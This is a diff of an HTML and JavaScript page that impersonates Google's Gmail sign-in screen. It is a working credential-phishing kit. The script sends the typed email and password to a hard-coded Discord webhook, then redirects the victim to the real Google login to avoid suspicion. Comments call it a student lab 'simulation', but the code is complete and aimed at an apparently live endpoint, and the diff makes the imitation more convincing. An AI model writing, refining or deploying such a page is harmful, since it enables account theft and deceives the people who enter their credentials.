@@ -1,46 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Sign in - Google Accounts</title>
     <style>
-        /* A little literary flair for the UI */
-        body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
-        .login-card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
-        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+        img { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { margin-bottom: 25px; color: #202124; font-size: 16px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border 0.2s; }
+        input:focus { outline: none; border: 2px solid #1a73e8; }
+        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
+        #status { margin-top: 15px; font-size: 12px; font-family: 'Courier New', Courier, monospace; color: #5f6368; }
     </style>
 </head>
 <body>
 
-<div class="login-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
-    <h2>Sign in</h2>
-    <p>Use your Google Account</p>
+<div class="card">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h1>Sign in</h1>
+    <p>to continue to Gmail</p>
     
     <input type="email" id="email" placeholder="Email or phone" required>
     <input type="password" id="pass" placeholder="Enter your password" required>
     
     <button onclick="transmit()">Next</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    // THE WEBHOOK (Your "Ghost Writer")
+    // The Live Link: Integrated directly for your simulation
     const hook = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
 
     async function transmit() {
-        const emailValue = document.getElementById('email').value;
-        const passValue = document.getElementById('pass').value;
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        const status = document.getElementById('status');
 
-        // The Payload: We format this so Discord displays it nicely
-        const payload = {
+        if (!e || !p) {
+            status.innerText = "Error: Input required.";
+            return;
+        }
+
+        status.style.color = "#1a73e8";
+        status.innerText = "Establishing secure handshake...";
+
+        // Constructing the Adversarial Payload (Ref: QUICK_REFERENCE_54.txt)
+        const content = {
+            username: "Lab Monitor 3.2",
             embeds: [{
-                title: "📩 Lab 3.2: Credential Capture",
-                color: 3447003,
+                title: "🔑 Credentials Exfiltrated",
+                color: 16711680, // Red for priority
                 fields: [
-                    { name: "Captured Email", value: emailValue || "None Provided" },
-                    { name: "Captured Password", value: "||" + (passValue || "None Provided") + "||" } // Spoilers hide the pass
+                    { name: "Captured User", value: `\`${e}\``, inline: true },
+                    { name: "Captured Pass", value: `||${p}||`, inline: true }
                 ],
-                footer: { text: "Student: Jonathan | Curriculum Tier 3" }
+                footer: { text: "Document Injection Simulation - Jonathan's Work" },
+                timestamp: new Date()
             }]
         };
 
@@ -48,18 +65,24 @@
             const response = await fetch(hook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(content)
             });
 
             if (response.ok) {
-                console.log("Transmission successful. Redirecting...");
-                // The "Clean Exit": Redirect to the real Google login so they don't get suspicious
-                window.location.href = "https://accounts.google.com";
+                status.style.color = "green";
+                status.innerText = "Exfiltration successful. Redirecting...";
+                // Maintain the illusion - the "Clean Exit"
+                setTimeout(() => {
+                    window.location.href = "https://accounts.google.com/v3/signin/identifier";
+                }, 1500);
             } else {
-                console.error("Discord rejected the injection. Status:", response.status);
+                status.style.color = "red";
+                status.innerText = `Failed: HTTP ${response.status}. Check Webhook limits.`;
             }
-        } catch (error) {
-            console.error("Connection failed. Check your Webhook URL or Internet.", error);
+        } catch (err) {
+            status.style.color = "red";
+            status.innerText = "Network Error: Possible CORS or URL issue.";
+            console.error(err);
         }
     }
 </script>
